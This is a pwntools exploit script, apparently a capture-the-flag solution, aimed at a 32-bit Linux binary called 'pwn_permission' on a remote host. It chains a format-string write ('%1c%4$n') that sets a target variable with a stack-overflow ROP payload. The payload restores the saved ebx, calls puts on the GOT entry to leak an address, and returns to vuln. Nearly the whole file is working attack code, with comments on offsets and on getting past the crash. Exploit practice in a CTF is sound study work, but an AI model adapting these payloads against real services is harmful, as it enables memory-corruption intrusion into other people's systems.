from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# The issue is that vuln saves/restores ebx
# When we overflow, we corrupt saved ebx at ebp-4
# When vuln returns, it restores corrupted ebx, causing crash

# Solution 1: Return to the instruction AFTER the ebx restore
# vuln ends with:
# 0x804926b:  mov     ebx, dword ptr [ebp - 4]  ; restore ebx
# 0x804926e:  leave                              ; mov esp, ebp; pop ebp
# 0x804926f:  ret

# If we return to 0x804926e (leave;ret), we skip the ebx restore
# But we still need to set up ebp correctly for leave

# Solution 2: Use a different approach - instead of returning to vuln,
# return to a ROP chain that calls puts and then reads again

# Solution 3: Put a valid value for saved ebx in our payload
# We need to know what ebx should be - it's used as GOT base
# ebx = 0x804c000 (the GOT base)
# So we can put 0x804c000 at offset ebp-4 from the buffer

# Buffer starts at ebp-0x90
# saved ebx is at ebp-4
# offset from buffer to saved ebx = 0x90 - 4 = 140
# offset from buffer to saved ebp = 0x90
# offset from buffer to return address = 0x90 + 4 = 148

# Let's try with correct ebx value
target_val_addr = 0x804c030
vuln_addr = elf.symbols['vuln']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# ebx should be 0x804c000 (GOT base)
got_base = 0x804c000

# Connect
conn = remote('39.96.193.120', 10000)

# Receive initial message
conn.recv(timeout=5)

# Stage 1: Format string to set target_val = 5
fmt_payload = p32(target_val_addr) + b'%1c%4$n'
conn.send(fmt_payload)

import time
time.sleep(1)
response = conn.recv(timeout=5)
log.info(f"After fmt payload: {response}")

# Stage 2: ROP chain with correct ebx
# Buffer layout:
# [0-139]: padding (140 bytes)
# [140-143]: saved ebx = 0x804c000
# [144-147]: saved ebp = some writable address (or junk)
# [148-151]: return address = puts_plt
# [152-155]: puts's return address = vuln_addr
# [156-159]: puts's argument = puts_got

payload = b'A' * 140                    # padding to saved ebx
payload += p32(got_base)                # saved ebx (correct value)
payload += p32(0x804c038)               # saved ebp (writable address in .bss)
payload += p32(puts_plt)                # return address -> call puts
payload += p32(vuln_addr)               # puts returns here
payload += p32(puts_got)                # argument to puts

conn.send(payload)

time.sleep(2)

# Check response
try:
    response2 = conn.recv(timeout=5)
    log.info(f"After ROP: {response2}")
    
    if b'Input:' in response2:
        log.success("Got Input: prompt! ROP chain worked!")
    else:
        log.info(f"Response: {response2.hex()}")
except EOFError:
    log.error("Connection closed (crash)")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()